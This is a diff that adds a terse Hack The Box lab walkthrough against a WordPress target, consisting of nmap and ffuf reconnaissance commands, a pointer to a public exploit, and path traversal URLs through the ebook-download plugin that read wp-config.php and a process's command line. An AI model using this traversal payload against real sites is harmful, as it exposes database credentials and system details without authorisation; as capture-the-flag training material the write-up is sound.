@@ -1,3 +1,45 @@
+
+
+```
+nmap -sS -sC -sV -T5 -Pn 10.10.11.125
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/be022ff2-0ea7-4b07-850c-62180b3ecaa5)
+
+
+```
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.11.125/wp-content/FUZZ -e .aspx,.php,.txt,.html
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/5f77925a-e53f-4365-8239-b28c5e9704f2)
+
+
+```
+http://10.10.11.125/wp-content/plugins/
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/fa8d6c3e-19ee-4647-868b-f71fc8fdc5fc)
+
+
+```
+https://www.exploit-db.com/exploits/39575
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/40ce0af1-0709-4d35-8248-112d04a32829)
+
+
+```
+/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/d3bfc7b6-6986-42bc-b970-94e3d598aff9)
+
+
+```
+http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/812/cmdline
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/6d3ff846-8d87-41ee-bb76-3d492edc6d34)
+![image](https://github.com/regarmulia/HTB/assets/33616880/5664cfa5-f4d7-4f34-bfbd-433946f7cf65)
+![image](https://github.com/regarmulia/HTB/assets/33616880/16123463-9033-489e-9fb1-024324f33a02)
+
+
+
+
 ```
 ps aux
 ```
